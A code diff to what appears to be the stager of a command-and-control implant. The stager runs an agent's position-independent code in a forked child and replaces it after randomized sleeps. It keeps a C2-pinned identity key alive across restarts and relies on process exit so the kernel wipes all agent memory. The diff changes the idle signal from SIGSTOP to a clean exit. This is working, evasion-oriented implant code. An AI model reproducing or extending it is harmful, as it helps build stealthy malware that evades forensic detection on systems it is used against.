@@ -12,8 +12,8 @@
  *
  * When enabled, the stager does not run the agent PIC in its own process.
  * Instead it forks a sacrificial child that runs the PIC and keeps the parent
- * clean, so the parent can terminate the child at any time and every byte of
- * agent code/data is reclaimed by the kernel.
+ * clean, so the child can be replaced at any time and every byte of agent
+ * code/data is reclaimed by the kernel.
  *
  * The parent also owns the agent's ephemeral identity key pair, which MUST
  * survive a restart: the C2 pins the agent's public key at first check-in
@@ -26,8 +26,10 @@
  * The PFS session key is deliberately not involved: it is re-negotiated via
  * ECDH on every message tunnel and must never be pinned.
  *
- * The agent signals idleness by raising SIGSTOP on itself. The parent sees
- * WIFSTOPPED, kills the child, then forks a fresh one after a randomized sleep.
+ * The agent signals idleness by exiting cleanly (exit_group). The parent reaps
+ * it and forks a fresh one after a randomized sleep. There is no SIGSTOP /
+ * SIGCONT handshake: process termination is what releases every byte of agent
+ * memory, and it works whether the child exits on its own or is killed.
  */
 
 typedef void (*supervise_entry_fn)(void *base_addr, size_t total_size);
@@ -45,11 +47,9 @@ typedef void (*supervise_entry_fn)(void *base_addr, size_t total_size);
 #endif
 
 /* Linux wait/signal ABI constants (the stager is freestanding). */
-#define SUPERVISE_WUNTRACED 2
 #define SUPERVISE_EINTR 4
 #define SUPERVISE_SIGKILL 9
 #define SUPERVISE_PR_SET_PDEATHSIG 1
-#define SUPERVISE_WIFSTOPPED(status) (((status) & 0x7f) == 0x7f)
 
 struct supervise_timespec {
   long tv_sec;
@@ -157,28 +157,20 @@ supervise_run(supervise_entry_fn entry, void *stage_blob, size_t blob_size) {
       supervise_write_all(kin[1], cached_key, sizeof(cached_key));
     supervise_close(kin[1]);
 
-    int status = 0;
     long w;
     do {
-      w = syscall4(SYS_wait4, pid, (long)&status, SUPERVISE_WUNTRACED, 0);
+      w = syscall4(SYS_wait4, pid, 0, 0, 0);
     } while (w == -SUPERVISE_EINTR);
 
-    /* The child wrote its key before going idle, so it is already buffered. */
+    /* The child wrote its key before exiting, so it is already buffered. */
     if (supervise_read_all(kout[0], cached_key, sizeof(cached_key)) ==
         (long)sizeof(cached_key)) {
       have_key = 1;
     }
     supervise_close(kout[0]);
 
-    /* Terminate the idle child ourselves: this frees all of its memory. If it
-     * already exited, the kill is a harmless ESRCH. */
-    syscall2(SYS_kill, pid, SUPERVISE_SIGKILL);
-    if (SUPERVISE_WIFSTOPPED(status)) {
-      do {
-        w = syscall4(SYS_wait4, pid, (long)&status, 0, 0);
-      } while (w == -SUPERVISE_EINTR);
-    }
-
+    /* The child has fully exited and been reaped, so the kernel has already
+     * reclaimed all of its memory. Just back off before the next lifecycle. */
     supervise_sleep(SUPERVISE_SLEEP_MIN, SUPERVISE_SLEEP_MAX);
   }
 }
